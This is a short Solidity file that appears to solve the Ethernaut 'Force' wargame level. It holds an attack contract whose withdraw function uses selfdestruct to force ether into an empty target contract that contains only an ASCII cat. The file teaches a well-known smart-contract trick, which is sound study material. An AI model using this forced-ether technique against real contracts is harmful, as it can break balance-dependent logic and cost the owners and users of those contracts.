// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EthernautForceAttack {
    EthernautForce target;

    constructor(address _addr) {
        target = EthernautForce(_addr);
    }

    fallback() external payable {}

    receive() external payable {}

    function withdraw() public {
        selfdestruct(payable(address(target)));
    }
}

contract EthernautForce {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}
